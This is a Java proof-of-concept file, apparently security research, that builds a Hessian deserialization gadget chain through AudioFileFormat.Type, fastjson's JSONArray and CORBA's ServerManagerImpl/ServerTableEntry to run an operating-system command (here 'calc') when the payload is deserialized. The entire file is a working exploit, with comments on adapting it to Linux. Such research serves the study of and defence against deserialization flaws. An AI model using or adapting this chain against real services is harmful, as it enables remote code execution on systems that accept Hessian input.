package com.test.gadget.blackhat2025;

import com.alibaba.fastjson.JSONArray;
import com.sun.corba.se.impl.activation.ServerManagerImpl;
import com.sun.corba.se.impl.activation.ServerTableEntry;
import com.sun.deploy.nativesandbox.IntegrityProcess;
import javafx.beans.property.IntegerProperty;
import tools.HessianTools;
import tools.ReflectTools;
import tools.UnsafeTools;

import javax.sound.sampled.AudioFileFormat;
import java.util.HashMap;

public class AudioFileFormat2toString {
    public static void main(String[] args) throws Exception {
        Object payload = getPayload();
        byte[] bytes = HessianTools.hessian2Ser2bytes(payload);
        HessianTools.hessian2Deser(bytes);
    }

    public static Object getPayload() throws Exception {
        Object entry = UnsafeTools.getObjectByUnsafe(ServerTableEntry.class);
        // process.exit不能报错；linux下使用UNIXProcess即可
        Object process = UnsafeTools.getObjectByUnsafe(IntegrityProcess.class);
        ReflectTools.setFieldValue(entry, "state", 2);
        ReflectTools.setFieldValue(entry, "process", process);
        ReflectTools.setFieldValue(entry, "activationCmd", "calc");

        HashMap<Object, Object> hashMap = new HashMap<>();
        // 键一定是Integer
        hashMap.put(1, entry);

        Object serverManager = UnsafeTools.getObjectByUnsafe(ServerManagerImpl.class);
        ReflectTools.setFieldValue(serverManager, "serverTable", hashMap);

        JSONArray jsonArray = new JSONArray();
        jsonArray.add(serverManager);

        HashMap<Object, Object> hashMap1 = new HashMap<>();
        HashMap<Object, Object> hashMap2 = new HashMap<>();
        Object type = UnsafeTools.getObjectByUnsafe(AudioFileFormat.Type.class);
        hashMap1.put("1", jsonArray);
        hashMap1.put("2", type);
        hashMap2.put("1", type);
        hashMap2.put("2", jsonArray);

        HashMap<Object, Object> finalMap = new HashMap<>();
        finalMap.put(hashMap1, "any");
        finalMap.put(hashMap2, "any");

        return finalMap;
    }
}
